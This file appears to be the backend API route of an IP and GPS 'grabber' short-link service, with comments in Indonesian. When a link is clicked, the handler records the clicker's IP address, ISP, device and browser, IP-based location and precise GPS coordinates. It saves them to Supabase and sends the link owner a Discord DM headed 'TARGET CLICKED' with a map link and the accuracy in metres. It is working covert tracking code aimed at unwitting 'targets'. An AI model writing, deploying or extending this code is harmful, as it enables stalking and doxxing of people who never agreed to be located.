import { createClient } from '@supabase/supabase-js';

const supabase = createClient(
  process.env.Supabase_URL || process.env.NEXT_PUBLIC_SUPABASE_URL,
  process.env.Supabase_KEY || process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
);

const DISCORD_BOT_TOKEN = process.env.Discord_BOT_TOKEN || process.env.DISCORD_BOT_TOKEN;

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { shortId, gps, timestamp } = req.body;

    if (!shortId) {
      return res.status(400).json({ error: 'shortId required' });
    }

    // Ambil data link
    const { data: linkData } = await supabase
      .from('links')
      .select('user_id, target_url')
      .eq('short_id', shortId)
      .single();

    // IP & Device
    const forwarded = req.headers['x-forwarded-for'];
    const ip = forwarded ? forwarded.split(',')[0].trim() : (req.socket.remoteAddress || '127.0.0.1');
    const rawAgent = req.headers['user-agent'] || 'Unknown Device';

    let browserName = "Unknown";
    if (rawAgent.includes("Chrome") && !rawAgent.includes("Edg")) browserName = "Google Chrome";
    else if (rawAgent.includes("Edg")) browserName = "Microsoft Edge";
    else if (rawAgent.includes("Safari") && !rawAgent.includes("Chrome")) browserName = "Safari";
    else if (rawAgent.includes("Firefox")) browserName = "Mozilla Firefox";

    const isMobile = rawAgent.includes("Mobile") || rawAgent.includes("Android") || rawAgent.includes("iPhone");
    const deviceType = isMobile ? "📱 Smartphone" : "💻 PC / Laptop";

    // IP Geolocation (fallback)
    let ipGeo = { city: 'Unknown', region: 'Unknown', country: 'Unknown', org: 'Unknown ISP', lat: '', lon: '' };
    try {
      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
      if (geoRes.ok) {
        const data = await geoRes.json();
        if (!data.error) {
          ipGeo = {
            city: data.city || 'Unknown',
            region: data.region || 'Unknown',
            country: data.country_name || 'Unknown',
            org: data.org || 'Unknown ISP',
            lat: data.latitude,
            lon: data.longitude
          };
        }
      }
    } catch (e) {}

    const hasGPS = gps && gps.lat && gps.lon;
    const locationMethod = hasGPS ? 'GPS' : 'IP';

    let mapLink = 'N/A';
    if (hasGPS && gps) {
      mapLink = `https://www.google.com/maps?q=${gps.lat},${gps.lon}`;
    } else if (ipGeo.lat && ipGeo.lon) {
      mapLink = `https://www.google.com/maps?q=${ipGeo.lat},${ipGeo.lon}`;
    }

    // Simpan ke Supabase
    await supabase
      .from('location_logs')
      .insert([{
        short_id: shortId,
        user_id: linkData?.user_id || null,
        ip_address: ip,
        browser: browserName,
        device: deviceType,
        city: ipGeo.city,
        region: ipGeo.region,
        country: ipGeo.country,
        isp: ipGeo.org,
        gps_lat: gps?.lat || null,
        gps_lon: gps?.lon || null,
        gps_accuracy: gps?.accuracy || null,
        location_method: locationMethod,
        timestamp: timestamp || new Date().toISOString()
      }]);

    // Update click count
    try {
      const { data: clickData } = await supabase
        .from('links')
        .select('click_count')
        .eq('short_id', shortId)
        .single();

      await supabase
        .from('links')
        .update({
          click_count: (clickData?.click_count || 0) + 1,
          last_click_at: new Date().toISOString()
        })
        .eq('short_id', shortId);
    } catch (e) {}

    // Kirim DM Discord
    if (linkData?.user_id && DISCORD_BOT_TOKEN) {
      await sendDiscordDM(linkData.user_id, {
        shortId,
        ip,
        org: ipGeo.org,
        location: `${ipGeo.city}, ${ipGeo.region}, ${ipGeo.country}`,
        device: deviceType,
        browser: browserName,
        target: linkData.target_url,
        mapLink,
        hasGPS,
        gpsLat: gps?.lat,
        gpsLon: gps?.lon,
        gpsAccuracy: gps?.accuracy
      });
    }

    return res.status(200).json({ success: true });

  } catch (error) {
    console.error('Error:', error);
    return res.status(500).json({ error: 'Server error' });
  }
}

async function sendDiscordDM(userId, data) {
  try {
    const channelRes = await fetch('https://discord.com/api/v10/users/@me/channels', {
      method: 'POST',
      headers: {
        'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ recipient_id: userId })
    });

    const channel = await channelRes.json();
    if (!channel.id) return;

    const embed = {
      title: data.hasGPS ? "🚨 TARGET CLICKED - GPS PRESISI! 🚨" : "🚨 TARGET CLICKED - IP ONLY",
      color: data.hasGPS ? 0x00ff00 : 0xffaa00,
      fields: [
        { name: "🔗 Short ID", value: `\`${data.shortId}\``, inline: true },
        { name: "🌐 IP Address", value: `\`${data.ip}\``, inline: true },
        { name: "📡 ISP", value: data.org || 'Unknown', inline: true },
        { name: "📍 Lokasi IP", value: data.location || 'Unknown', inline: false },
        { name: "🖥️ Perangkat", value: data.device, inline: true },
        { name: "🌐 Browser", value: data.browser, inline: true },
        { name: "🎯 Target URL", value: data.target, inline: false },
        { name: "🗺️ Google Maps", value: `[Buka Peta](${data.mapLink})`, inline: false }
      ],
      timestamp: new Date().toISOString()
    };

    if (data.hasGPS && data.gpsLat && data.gpsLon) {
      embed.fields.splice(5, 0, {
        name: "📍 GPS Location (PRESISI)",
        value: `Lat: ${data.gpsLat}\nLon: ${data.gpsLon}\nAkurasi: ±${Math.round(data.gpsAccuracy)} meter`,
        inline: false
      });
      embed.footer = {
        text: data.gpsAccuracy < 500 ? '✅ PRESISI! Lokasi dalam radius 500m' : `⚠️ ${Math.round(data.gpsAccuracy)}m (melebihi target)`
      };
    } else {
      embed.footer = {
        text: '⚠️ IP geolocation (akurasi rendah 50-100km)'
      };
    }

    await fetch(`https://discord.com/api/v10/channels/${channel.id}/messages`, {
      method: 'POST',
      headers: {
        'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ embeds: [embed] })
    });

  } catch (e) {
    console.error("DM Error:", e);
  }
}